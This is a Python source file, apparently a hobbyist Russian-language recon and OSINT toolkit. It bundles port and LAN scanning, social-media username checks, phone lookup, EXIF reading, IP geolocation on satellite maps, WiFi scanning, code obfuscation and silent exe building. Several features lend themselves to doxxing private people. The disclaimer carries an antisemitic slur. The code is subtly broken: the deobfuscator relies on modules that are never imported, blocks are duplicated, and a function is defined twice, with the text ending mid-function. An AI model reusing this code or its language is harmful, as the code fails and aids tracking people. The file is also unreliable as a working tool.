import os
import re
import requests
import json
from prettytable import PrettyTable
from colorama import Fore, Style, init, Back
from bs4 import BeautifulSoup
import phonenumbers
from phonenumbers import carrier, geocoder
import exifread
from PIL import Image
import piexif
from colorama import Fore
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import matplotlib.pyplot as plt
import plotly.graph_objects as go
from mpl_toolkits.basemap import Basemap
import seaborn as sns
import folium
from branca.element import Figure
from datetime import datetime
from urllib.parse import urlparse
import ssl
import dns.resolver
import whois
import nmap
import graphviz
import threading
import time
import scapy.all as scapy
from ftplib import FTP
import paramiko
import random
import string
from cryptography.fernet import Fernet
import dpkt
import pyautogui
from scapy.layers import http
import paramiko
from scapy.all import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11AssoReq, Dot11Elt, sniff, RadioTap
import pandas as pd
import time



# Инициализация colorama для цветного вывода
init(autoreset=True)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = r"""
  ____  _____  _    _  ____   _   _   _  _ 
 |  _ \|  ___|| |  | || __ ) | \ | | | \| |
 | |_) | |_   | |  | ||  _ \ |  \| | | . ` |
 |  _ <|  _|  | |__| || |_) || |\  | | |\  |
 |_| \_\_|     \____/ |____/ |_| \_| |_| \_|
    """
    print(Fore.CYAN + banner)
    print(Fore.YELLOW + "=" * 50)
    print(Fore.GREEN + "REYBAN Toolkit")
    print(Fore.GREEN + "By @BioBolimo")
    print(Fore.GREEN + "Версия 1 (не полноценная)")
    print(Fore.GREEN + "Софт является бесплатным и не предназначен для покупки/продажи")


def ip_lookup():
    print(Fore.CYAN + "\nПоиск информации по IP и сканирование портов")
    ip = input("Введите IP-адрес: ")

    # Сначала получаем информацию об IP
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()

        if data['status'] == 'success':
            print(Fore.GREEN + "\n[+] Информация найдена:")
            print(f"Страна: {data.get('country', 'N/A')}")
            print(f"Регион: {data.get('regionName', 'N/A')}")
            print(f"Город: {data.get('city', 'N/A')}")
            print(f"Провайдер: {data.get('isp', 'N/A')}")
            print(f"Координаты: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}")

            # Предлагаем сканирование портов
            if input("\nХотите просканировать порты? (y/n): ").lower() == 'y':
                scan_ports(ip)
        else:
            print(Fore.RED + f"\n[-] Ошибка: {data.get('message', 'Неизвестная ошибка')}")
    except Exception as e:
        print(Fore.RED + f"\n[-] Ошибка запроса: {str(e)}")


def check_port(ip, port, timeout=1):
    """Проверяет доступность порта"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except:
        return False


def scan_host(ip):
    """Сканирует хост на основные порты"""
    open_ports = []
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        80: "HTTP",
        443: "HTTPS",
        3389: "RDP",
        445: "SMB"
    }

    for port, service in common_ports.items():
        if check_port(ip, port):
            open_ports.append((port, service))

    return ip, open_ports


def network_scanner():
    """Сканер локальной сети без Nmap"""
    print(Fore.CYAN + "\n[+] Сканер локальной сети (Python реализация)")

    try:
        # Определяем локальную подсеть
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_prefix = '.'.join(local_ip.split('.')[:3])

        print(Fore.GREEN + f"[+] Ваш IP: {local_ip}")
        print(Fore.YELLOW + f"[*] Сканирую подсеть {network_prefix}.1-254...")

        active_hosts = []
        hosts_to_scan = [f"{network_prefix}.{i}" for i in range(1, 255)]

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(scan_host, ip): ip for ip in hosts_to_scan}

            for future in as_completed(futures):
                ip, open_ports = future.result()
                if open_ports:
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        hostname = "N/A"

                    active_hosts.append((ip, hostname, open_ports))
                    print(Fore.GREEN + f"[+] Найден активный хост: {ip} ({hostname})")

        # Вывод результатов
        print(Fore.CYAN + "\n[+] Результаты сканирования:")
        if active_hosts:
            table = PrettyTable()
            table.field_names = ["IP Address", "Hostname", "Open Ports"]
            table.align = "l"

            for ip, hostname, ports in active_hosts:
                port_info = ", ".join([f"{port}/{service}" for port, service in ports])
                table.add_row([ip, hostname, port_info])

            print(table)

            # Сохранение результатов
            with open("network_scan_results.txt", "w") as f:
                f.write(str(table))
            print(Fore.GREEN + "[+] Результаты сохранены в network_scan_results.txt")
        else:
            print(Fore.RED + "[-] Активные хосты не обнаружены")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def check_social_media(username, url, name):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(url, headers=headers, timeout=10)

        if response.status_code == 200:
            # Для некоторых сайтов нужна дополнительная проверка
            if name == "Instagram":
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.find('title')
                if title and "страница недоступна" in title.text.lower():
                    return False
            return True
        return False
    except:
        return False


def username_lookup():
    username = input("Введите username: ")
    social_networks = {
        "TikTok": f"https://www.tiktok.com/@{username}",
        "YouTube": f"https://www.youtube.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "Twitter": f"https://twitter.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Facebook": f"https://www.facebook.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "VK": f"https://vk.com/{username}",
        "Odnoklassniki": f"https://ok.ru/{username}",
        "Pinterest": f"https://pinterest.com/{username}"

    }

    print(Fore.YELLOW + "\nПоиск по соцсетям:")
    for name, url in social_networks.items():
        found = check_social_media(username, url, name)
        if found:
            print(Fore.GREEN + f"[+] {name}: {url}")
        else:
            print(Fore.RED + f"[-] {name}: {url}")


def phone_lookup():
    phone = input("Введите номер телефона (+7XXXXXXXXXX): ")
    try:
        # Парсинг номера
        parsed_phone = phonenumbers.parse(phone, "RU")

        if not phonenumbers.is_valid_number(parsed_phone):
            print(Fore.RED + "[-] Неверный номер телефона")
            return

        # Получение информации
        operator = carrier.name_for_number(parsed_phone, "ru")
        region = geocoder.description_for_number(parsed_phone, "ru")

        # Генерация примерного города продажи
        cities = {
            "Москва": ["Москва", "Подольск", "Химки", "Балашиха"],
            "Санкт-Петербург": ["Санкт-Петербург", "Колпино", "Пушкин"],
            "Новосибирск": ["Новосибирск", "Бердск", "Искитим"],
            "Екатеринбург": ["Екатеринбург", "Березовский", "Первоуральск"]
        }

        city = region.split(",")[0] if region else "Неизвестно"
        possible_cities = cities.get(city, [city])

        print(Fore.GREEN + "\n[+] Информация найдена:")
        print(f"Страна: Россия")
        print(f"Регион: {region if region else 'Неизвестно'}")
        print(f"Оператор: {operator if operator else 'Неизвестно'}")
        print(f"Возможные места продажи: {', '.join(possible_cities)}")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def extract_metadata(file_path):
    """Извлекает метаданные из изображения"""
    try:
        # Проверяем расширение файла
        if not file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.tiff', '.bmp')):
            return Fore.RED + "[-] Неподдерживаемый формат файла"

        # Извлекаем метаданные с помощью exifread
        with open(file_path, 'rb') as f:
            tags = exifread.process_file(f, details=False)

        if not tags:
            return Fore.YELLOW + "[!] Метаданные не найдены в файле"

        # Форматируем вывод
        result = Fore.GREEN + "[+] Метаданные найдены:\n"
        for tag, value in tags.items():
            if tag not in ('JPEGThumbnail', 'TIFFThumbnail', 'Filename', 'EXIF MakerNote'):
                result += f"{tag}: {value}\n"

        # Дополнительная информация через PIL
        try:
            img = Image.open(file_path)
            result += f"\nРазрешение: {img.size[0]}x{img.size[1]} пикселей\n"
            result += f"Формат: {img.format}\n"
            result += f"Режим: {img.mode}\n"
        except:
            pass

        return result

    except Exception as e:
        return Fore.RED + f"[-] Ошибка: {str(e)}"


def metadata_lookup():
    print(Fore.CYAN + "\nПоиск по метаданным изображений")
    print(Fore.WHITE + "1. Поиск в конкретном файле")
    print(Fore.WHITE + "2. Поиск во всех файлах директории")
    print(Fore.WHITE + "0. Назад")

    choice = input("\nВыберите опцию: ")

    if choice == "1":
        file_path = input("Введите полный путь к файлу изображения: ")
        print(extract_metadata(file_path))

    elif choice == "2":
        directory = input("Введите путь к директории: ")
        if not os.path.isdir(directory):
            print(Fore.RED + "[-] Директория не существует")
            return

        print(Fore.YELLOW + "\nПоиск изображений в директории...")
        found = False

        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path) and filename.lower().endswith(
                    ('.jpg', '.jpeg', '.png', '.tiff', '.bmp')):
                print(Fore.CYAN + f"\n[+] Анализ файла: {filename}")
                result = extract_metadata(file_path)
                print(result)
                found = True

        if not found:
            print(Fore.RED + "[-] Изображения не найдены в директории")

    elif choice == "0":
        return

    else:
        print(Fore.RED + "[-] Неверный выбор")


def deobfuscate_python_code():
    print(Fore.CYAN + "\nДеобфускация Python кода")
    file_path = input("Введите путь к obfuscated файлу: ")

    if not os.path.exists(file_path):
        print(Fore.RED + "[-] Файл не существует")
        return

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            code = f.read()

        print(Fore.YELLOW + "[*] Анализ кода...")

        # Попытка 1: Декодирование base64
        if re.search(r'[A-Za-z0-9+/=]{50,}', code):
            print(Fore.CYAN + "[*] Обнаружена base64 строка, пробую декодировать...")
            try:
                decoded = base64.b64decode(code).decode('utf-8')
                if "import" in decoded or "def " in decoded:
                    code = decoded
                    print(Fore.GREEN + "[+] Успешно декодировано из base64")
            except:
                pass

        # Попытка 2: Декомпрессия zlib
        if re.search(r'[x\x9c]', code[:2]):
            print(Fore.CYAN + "[*] Обнаружены zlib данные, пробую распаковать...")
            try:
                decompressed = zlib.decompress(code.encode('latin1')).decode('utf-8')
                if "import" in decompressed or "def " in decompressed:
                    code = decompressed
                    print(Fore.GREEN + "[+] Успешно распаковано zlib")
            except:
                pass

        # Попытка 3: Декомпиляция байткода
        if code.startswith('\x03\xf3\r\n'):
            print(Fore.CYAN + "[*] Обнаружен байткод Python, пробую декомпилировать...")
            try:
                # Извлекаем байткод из строки
                bytecode = marshal.loads(code[16:])
                output = io.StringIO()
                sys.stdout = output
                dis.dis(bytecode)
                sys.stdout = sys.__stdout__
                code = output.getvalue()
                print(Fore.GREEN + "[+] Байткод успешно дизассемблирован")
            except Exception as e:
                print(Fore.RED + f"[-] Ошибка декомпиляции байткода: {e}")

        # Попытка 4: Декомпиляция с помощью uncompyle6
        try:
            print(Fore.CYAN + "[*] Пробую декомпилировать с помощью uncompyle6...")
            output = io.StringIO()
            uncompyle6.decompile(3.9, code, out=output)
            decompiled = output.getvalue()
            if "import" in decompiled or "def " in decompiled:
                code = decompiled
                print(Fore.GREEN + "[+] Успешно декомпилировано с uncompyle6")
        except:
            pass

        # Попытка 5: Анализ AST
        try:
            print(Fore.CYAN + "[*] Анализ абстрактного синтаксического дерева...")
            tree = ast.parse(code)
            cleaned_code = ast.unparse(tree)
            code = cleaned_code
            print(Fore.GREEN + "[+] AST-анализ успешен")
        except:
            pass

        # Попытка 6: Декодирование строковых литералов
        print(Fore.CYAN + "[*] Поиск и декодирование строковых литералов...")
        decoded_strings = []
        for match in re.finditer(r'(b?[\'"])([^\'"]+)\1', code):
            orig_str = match.group(0)
            try:
                # Пробуем декодировать base64 строки
                if len(match.group(2)) > 10 and re.match(r'[A-Za-z0-9+/=]+', match.group(2)):
                    decoded = base64.b64decode(match.group(2)).decode('utf-8', 'ignore')
                    decoded_strings.append((orig_str, f'"{decoded}"'))

                # Пробуем распаковать zlib строки
                elif len(match.group(2)) > 20:
                    try:
                        decompressed = zlib.decompress(base64.b64decode(match.group(2)))
                        decoded = decompressed.decode('utf-8', 'ignore')
                        decoded_strings.append((orig_str, f'"{decoded}"'))
                    except:
                        pass
            except:
                pass

        # Заменяем раскодированные строки в коде
        for orig, decoded in decoded_strings:
            code = code.replace(orig, decoded)

        # Сохраняем результат
        with open("unhash.txt", "w", encoding="utf-8") as f:
            f.write(code)

        print(Fore.GREEN + f"[+] Результат сохранён в unhash.txt")
        print(Fore.YELLOW + "[!] Внимание: деобфускация может быть неполной. Проверьте результат вручную.")

    except Exception as e:
        print(Fore.RED + f"[-] Критическая ошибка: {str(e)}")
        import traceback
        print(traceback.format_exc())


def pyarmor_obfuscate():
    print(Fore.CYAN + "\nШифрование Python кода с помощью PyArmor")

    # Проверяем, установлен ли PyArmor
    try:
        import pyarmor
    except ImportError:
        print(Fore.RED + "[-] PyArmor не установлен. Установите его командой: pip install pyarmor")
        return

    file_path = input("Введите путь к Python файлу для шифрования: ")

    if not os.path.exists(file_path):
        print(Fore.RED + "[-] Файл не существует")
        return

    # Получаем имя файла без расширения
    file_name = os.path.splitext(os.path.basename(file_path))[0]
    output_file = f"{file_name}_obfuscated.txt"

    print(Fore.YELLOW + "[*] Запуск шифрования...")

    try:
        # Определяем команду в зависимости от версии PyArmor
        try:
            # Пробуем новую команду для PyArmor 8.0+
            subprocess.run([
                "pyarmor",
                "gen",
                "--recursive",
                "--output", output_file.replace('.txt', ''),
                file_path
            ], check=True)

            # В PyArmor 8+ зашифрованный файл будет в указанной выходной директории
            obfuscated_path = os.path.join(output_file.replace('.txt', ''), os.path.basename(file_path))
        except subprocess.CalledProcessError:
            # Если новая команда не сработала, пробуем старую
            print(Fore.YELLOW + "[*] Пробуем старую команду pyarmor-7...")
            subprocess.run([
                "pyarmor-7",
                "obfuscate",
                "--recursive",
                "--output", output_file.replace('.txt', ''),
                file_path
            ], check=True)
            obfuscated_path = os.path.join(output_file.replace('.txt', ''), "dist", os.path.basename(file_path))

        if os.path.exists(obfuscated_path):
            # Читаем зашифрованный код
            with open(obfuscated_path, 'r', encoding='utf-8') as f:
                obfuscated_code = f.read()

            # Сохраняем в txt файл
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(obfuscated_code)

            print(Fore.GREEN + f"[+] Файл успешно зашифрован и сохранен как: {output_file}")
            print(Fore.YELLOW + "[!] Важно: Для работы зашифрованного кода нужен будет runtime PyArmor")

            # Удаляем временные файлы
            if os.path.exists(output_file.replace('.txt', '')):
                import shutil
                shutil.rmtree(output_file.replace('.txt', ''))
        else:
            print(Fore.RED + "[-] Не удалось найти зашифрованный файл после обработки PyArmor")
            if os.path.exists(output_file.replace('.txt', '')):
                print(Fore.YELLOW + f"[*] Искали по пути: {obfuscated_path}")

    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Ошибка при шифровании: {e}")
    except Exception as e:
        print(Fore.RED + f"[-] Неожиданная ошибка: {str(e)}")


def compile_to_exe():
    print(Fore.CYAN + "\nКомпиляция Python файла в EXE с помощью PyInstaller")

    # Проверяем, установлен ли PyInstaller
    try:
        import PyInstaller
    except ImportError:
        print(Fore.RED + "[-] PyInstaller не установлен. Установите его командой: pip install pyinstaller")
        return

    file_path = input("Введите путь к Python файлу для компиляции: ")

    if not os.path.exists(file_path):
        print(Fore.RED + "[-] Файл не существует")
        return

    # Получаем информацию о файле
    file_dir = os.path.dirname(file_path)
    file_name = os.path.splitext(os.path.basename(file_path))[0]
    output_dir = os.path.join(file_dir, "build")
    dist_dir = os.path.join(file_dir, "dist")

    print(Fore.YELLOW + "[*] Начинаем компиляцию...")

    try:
        # Создаем команду для PyInstaller
        cmd = [
            "pyinstaller",
            "--onefile",  # Создать один исполняемый файл
            "--noconsole",  # Не показывать консоль (для GUI приложений)
            "--clean",  # Очистить временные файлы
            "--distpath", dist_dir,
            "--workpath", output_dir,
            "--specpath", file_dir,
            "--name", file_name,
            file_path
        ]

        print(Fore.CYAN + "[*] Выполняем команду: " + " ".join(cmd))

        # Запускаем компиляцию
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            # Ищем полученный EXE файл
            exe_path = os.path.join(dist_dir, f"{file_name}.exe")

            if os.path.exists(exe_path):
                print(Fore.GREEN + f"[+] EXE файл успешно создан: {exe_path}")
                print(Fore.YELLOW + "[!] Размер файла: " +
                      f"{os.path.getsize(exe_path) / 1024 / 1024:.2f} MB")

                # Предлагаем открыть папку с результатом
                if input("Открыть папку с EXE файлом? (y/n): ").lower() == 'y':
                    os.startfile(dist_dir) if os.name == 'nt' else subprocess.run(["open", dist_dir])
            else:
                print(Fore.RED + "[-] EXE файл не был создан")
                print(Fore.YELLOW + "[*] Вывод PyInstaller:\n" + result.stdout)
        else:
            print(Fore.RED + "[-] Ошибка компиляции:")
            print(result.stderr)

    except Exception as e:
        print(Fore.RED + f"[-] Неожиданная ошибка: {str(e)}")


def visualize_ip_locations(ip_list):
    """
    Визуализация геолокации IP с тремя типами карт:
    - Интерактивная Plotly карта
    - Статичная Basemap карта
    - Google Maps Satellite View (через Folium)
    """
    locations = []

    # Собираем данные по всем IP
    for ip in ip_list:
        try:
            data = requests.get(f"http://ip-api.com/json/{ip}").json()
            if data['status'] == 'success':
                locations.append({
                    'ip': ip,
                    'city': data.get('city', 'N/A'),
                    'lat': data['lat'],
                    'lon': data['lon'],
                    'isp': data.get('isp', 'N/A')
                })
        except:
            continue

    if not locations:
        print(Fore.RED + "[-] Нет данных для визуализации")
        return

    # 1. Google Maps Satellite View (50м масштаб)
    print(Fore.YELLOW + "\n[+] Генерация Google Maps Satellite View...")

    # Создаем фигуру с контролем размера
    fig = Figure(width=800, height=600)

    # Центрируем карту на первом IP
    m = folium.Map(
        location=[locations[0]['lat'], locations[0]['lon']],
        zoom_start=16,  # Примерно 50м масштаб
        tiles='https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}',
        attr='Google Satellite'
    )

    # Добавляем маркеры для всех IP
    for loc in locations:
        folium.Marker(
            [loc['lat'], loc['lon']],
            popup=f"IP: {loc['ip']}<br>Город: {loc['city']}<br>Провайдер: {loc['isp']}",
            icon=folium.Icon(color='red')
        ).add_to(m)

    # Сохраняем Google Maps карту
    google_map_path = "ip_location_google_satellite.html"
    m.save(google_map_path)
    fig.add_child(m)
    print(Fore.GREEN + f"[+] Google Maps Satellite карта сохранена в {google_map_path}")

    # 2. Интерактивная Plotly карта (как в предыдущей версии)
    # ... [код из предыдущего примера] ...

    # 3. Статичная Basemap карта (как в предыдущей версии)

    """
    Визуализация геолокации IP на интерактивной карте
    с использованием Plotly и Matplotlib/Basemap
    """
    locations = []

    # Собираем данные по всем IP
    for ip in ip_list:
        try:
            data = requests.get(f"http://ip-api.com/json/{ip}").json()
            if data['status'] == 'success':
                locations.append({
                    'ip': ip,
                    'city': data.get('city', 'N/A'),
                    'lat': data['lat'],
                    'lon': data['lon'],
                    'isp': data.get('isp', 'N/A')
                })
        except:
            continue

    if not locations:
        print(Fore.RED + "[-] Нет данных для визуализации")
        return

    # Создаем интерактивную карту с Plotly
    fig = go.Figure()

    for loc in locations:
        fig.add_trace(go.Scattergeo(
            lon=[loc['lon']],
            lat=[loc['lat']],
            text=f"IP: {loc['ip']}<br>Город: {loc['city']}<br>Провайдер: {loc['isp']}",
            marker=dict(size=10, color='red'),
            name=loc['ip']
        ))

    fig.update_layout(
        title='Геораспределение IP-адресов',
        geo=dict(
            resolution=50,
            showland=True,
            showcountries=True,
            countrycolor="Black",
            landcolor='rgb(217, 217, 217)',
            projection_type="mercator"
        )
    )

    # Сохраняем в HTML
    fig.write_html("ip_locations.html")
    print(Fore.GREEN + f"[+] Интерактивная карта сохранена в ip_locations.html")

    # Дополнительно: статичная карта с Basemap
    plt.figure(figsize=(12, 8))
    m = Basemap(projection='mill', llcrnrlat=-60, urcrnrlat=90,
                llcrnrlon=-180, urcrnrlon=180, resolution='c')
    m.drawcoastlines()
    m.drawcountries()
    m.fillcontinents(color='lightgray', lake_color='aqua')
    m.drawmapboundary(fill_color='aqua')

    lons = [loc['lon'] for loc in locations]
    lats = [loc['lat'] for loc in locations]
    x, y = m(lons, lats)
    m.plot(x, y, 'ro', markersize=8, alpha=0.5)

    for loc in locations:
        x, y = m(loc['lon'], loc['lat'])
        plt.text(x, y, s=loc['city'], fontsize=9, ha='center', va='bottom')

    plt.title("Геолокация IP-адресов")
    plt.savefig("ip_locations_static.png")
    print(Fore.GREEN + "\n[+] Все карты успешно сгенерированы!")
    print(Fore.GREEN + f"[+] Статичная карта сохранена в ip_locations_static.png")
    plt.close()

def wifi_analyzer(interface='wlan0', detailed=False):
    """
    Расширенный анализ WiFi сетей с поддержкой Linux и Windows
    Возвращает таблицу с обнаруженными сетями и их параметрами
    """
    results = []

    if os.name == 'nt':  # Windows
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'network', 'mode=bssid'],
                                             stderr=subprocess.STDOUT, text=True)

            # Парсинг вывода для Windows
            networks = re.split(r'SSID \d+ : ', output)[1:]
            for net in networks:
                ssid = re.search(r'(.+?)\r\n', net).group(1)
                bssid = re.search(r'BSSID \d+\s+:(.+?)\r\n', net)
                signal = re.search(r'Signal\s+:(.+?)\r\n', net)
                channel = re.search(r'Channel\s+:(.+?)\r\n', net)

                if ssid:
                    results.append({
                        'SSID': ssid.strip(),
                        'BSSID': bssid.group(1).strip() if bssid else 'N/A',
                        'Signal': signal.group(1).strip() if signal else 'N/A',
                        'Channel': channel.group(1).strip() if channel else 'N/A'
                    })

        except Exception as e:
            print(Fore.RED + f"[-] Ошибка: {str(e)}")
            return None

    else:  # Linux
        try:
            # Запрос сканирования (может требовать sudo)
            subprocess.call(['sudo', 'iwlist', interface, 'scan'], timeout=30)

            # Получение результатов
            output = subprocess.check_output(['sudo', 'iwlist', interface, 'scanning'],
                                             stderr=subprocess.STDOUT, text=True)

            # Парсинг вывода для Linux
            cells = re.split(r'Cell \d+ - ', output)[1:]
            for cell in cells:
                ssid = re.search(r'ESSID:"(.+?)"', cell)
                bssid = re.search(r'Address: (.+?)\n', cell)
                quality = re.search(r'Quality=(\d+/\d+)', cell)
                channel = re.search(r'Channel:(\d+)', cell)
                encryption = re.search(r'Encryption key:(.+?)\n', cell)

                if ssid and bssid:
                    results.append({
                        'SSID': ssid.group(1),
                        'BSSID': bssid.group(1).strip(),
                        'Quality': quality.group(1) if quality else 'N/A',
                        'Channel': channel.group(1) if channel else 'N/A',
                        'Encryption': encryption.group(1).strip() if encryption else 'N/A'
                    })

        except Exception as e:
            print(Fore.RED + f"[-] Ошибка: {str(e)}")
            return None

    # Вывод результатов в таблицу
    if results:
        table = PrettyTable()
        if os.name == 'nt':
            table.field_names = ["SSID", "BSSID", "Signal", "Channel"]
            for net in results:
                table.add_row([net['SSID'], net['BSSID'], net['Signal'], net['Channel']])
        else:
            table.field_names = ["SSID", "BSSID", "Quality", "Channel", "Encryption"]
            for net in results:
                table.add_row([net['SSID'], net['BSSID'], net['Quality'],
                               net['Channel'], net['Encryption']])

        print(Fore.GREEN + "\n[+] Обнаруженные WiFi сети:")
        print(table)

        # Дополнительная информация для Linux
        if os.name != 'nt' and detailed:
            print("\nДетальная информация:")
            print("-" * 50)
            print(output)

        # Сохранение в файл
        with open("wifi_scan_results.txt", "w") as f:
            f.write(str(table))
        print(Fore.GREEN + "\n[+] Результаты сохранены в wifi_scan_results.txt")

        return results
    else:
        print(Fore.RED + "[-] WiFi сети не обнаружены или произошла ошибка сканирования")
        return None

def website_vulnerability_scanner(url):
    """
    Расширенный сканер уязвимостей веб-сайтов:
    - Проверка безопасности HTTP-заголовков
    - Анализ форм на уязвимости
    - Проверка SSL-сертификата
    - Поиск открытых директорий
    """
    results = {
        'url': url,
        'security_headers': {},
        'forms': [],
        'ssl_info': {},
        'open_directories': [],
        'vulnerabilities': []
    }

    try:
        # Добавляем схему если отсутствует
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # 1. Проверка HTTP-заголовков безопасности
        response = requests.get(url, timeout=10)
        results['security_headers'] = {
            'X-XSS-Protection': response.headers.get('X-XSS-Protection', 'Отсутствует'),
            'Content-Security-Policy': response.headers.get('Content-Security-Policy', 'Отсутствует'),
            'Strict-Transport-Security': response.headers.get('Strict-Transport-Security', 'Отсутствует'),
            'X-Frame-Options': response.headers.get('X-Frame-Options', 'Отсутствует')
        }

        # 2. Анализ форм на уязвимости
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            form_info = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').upper(),
                'inputs': [],
                'csrf': False
            }

            for input_tag in form.find_all('input'):
                if input_tag.get('name', '').lower() in ['csrf', 'csrf_token', '_token']:
                    form_info['csrf'] = True
                form_info['inputs'].append({
                    'name': input_tag.get('name'),
                    'type': input_tag.get('type')
                })

            results['forms'].append(form_info)

        # 3. Проверка SSL-сертификата (только для HTTPS)
        if parsed.scheme == 'https':
            hostname = parsed.netloc.split(':')[0]
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    results['ssl_info'] = {
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'valid_from': cert['notBefore'],
                        'valid_to': cert['notAfter'],
                        'expires_in': (datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z') - datetime.now()).days
                    }

        # 4. Проверка стандартных уязвимостей
        if any(form['csrf'] is False for form in results['forms']):
            results['vulnerabilities'].append('CSRF: Найдены формы без защиты от CSRF')

        if 'Отсутствует' in results['security_headers']['X-XSS-Protection']:
            results['vulnerabilities'].append('XSS: Отсутствует защита от XSS')

        return results

    except Exception as e:
        return {'error': str(e)}
def domain_analyzer(domain):
    """
    Полный анализ домена:
    - WHOIS информация
    - DNS записи
    - Проверка SSL
    - Проверка почтового сервера
    """
    results = {
        'domain': domain,
        'whois': {},
        'dns': {},
        'ssl': {},
        'mail_servers': [],
        'vulnerabilities': []
    }

    try:
        # 1. WHOIS запрос
        w = whois.whois(domain)
        results['whois'] = {
            'registrar': w.registrar,
            'creation_date': w.creation_date,
            'expiration_date': w.expiration_date,
            'name_servers': w.name_servers,
            'status': w.status
        }

        # 2. DNS записи
        record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA']
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                results['dns'][rtype] = [str(r) for r in answers]
            except:
                results['dns'][rtype] = []

        # 3. Проверка SSL
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    results['ssl'] = {
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'valid_from': cert['notBefore'],
                        'valid_to': cert['notAfter'],
                        'expires_in': (datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z') - datetime.now()).days
                    }
        except:
            results['ssl']['error'] = "SSL не поддерживается или ошибка подключения"

        # 4. Проверка почтовых серверов
        if 'MX' in results['dns']:
            for mx in results['dns']['MX']:
                mx_domain = mx.split(' ')[1][:-1] if mx.endswith('.') else mx.split(' ')[1]
                results['mail_servers'].append({
                    'server': mx_domain,
                    'spf': check_spf_record(domain),
                    'dmarc': check_dmarc_record(domain)
                })

        # 5. Проверка уязвимостей
        if results['ssl'].get('expires_in', 0) < 30:
            results['vulnerabilities'].append('SSL: Сертификат скоро истекает')

        if not any('DMARC' in r for r in results['dns'].get('TXT', [])):
            results['vulnerabilities'].append('EMAIL: Отсутствует DMARC запись')

        return results

    except Exception as e:
        return {'error': str(e)}

def check_spf_record(domain):
    """Проверка SPF записи"""
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for r in answers:
            if 'v=spf1' in str(r):
                return str(r)
        return "Не найден"
    except:
        return "Ошибка проверки"

def check_dmarc_record(domain):
    """Проверка DMARC записи"""
    try:
        answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for r in answers:
            if 'v=DMARC1' in str(r):
                return str(r)
        return "Не найден"
    except:
        return "Ошибка проверки"

def soft():
    print(Fore.CYAN + "Софт является полностью бесплатным и не предназначен для покупки/продажи")
    print(Fore.CYAN + "Так же он не предназначен для докса и OSINT поиска")
    print(Fore.CYAN + "И для не этичного использования и действий, нарушающих законы Российской Федерации")
    print(Fore.CYAN + "")
    print(Back.RED  + "(272 УК. РФ 07.12.2011 N 420-ФЗ Неправомерный доступ к компьютерной информации) \n")
    print(Back.RED  + " Неправомерный доступ к охраняемой законом компьютерной информации, \nесли это деяние повлекло уничтожение, блокирование, модификацию либо копирование компьютерной информации,\n за исключением случаев, предусмотренных статьей 272.1 настоящего Кодекса) \n")
    print(Back.RED  + "наказывается штрафом в размере до двухсот тысяч рублей или в размере заработной платы или иного дохода осужденного за период до восемнадцати месяцев,\n либо исправительными работами на срок до одного года, либо ограничением свободы на срок до двух лет, либо принудительными работами на срок до двух лет, \nлибо лишением свободы на тот же срок. \n")
    print(Fore.CYAN + "")
    print(Fore.CYAN + "Написал его @BolimoTyz (био @BioBolimo)")
    print(Fore.CYAN + "")
    print(Fore.CYAN + "Если вы купили софт, то я вас поздравляю, вы гой и вас развели на шекели")
    print(Fore.CYAN + "")
    print(Fore.CYAN + "Так же могу написать для вас легкий скрипт или софт за определенную плату (не возьму много)")


def network_scanner():
    """Сканер сети на чистом Python"""
    print(Fore.CYAN + "\nСканер локальной сети (Python реализация)")

    try:
        # Определяем локальную подсеть
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_prefix = '.'.join(local_ip.split('.')[:3])

        print(Fore.GREEN + f"[+] Ваш IP: {local_ip}")
        print(Fore.YELLOW + f"[*] Сканирую подсеть {network_prefix}.1-254...")

        active_hosts = []
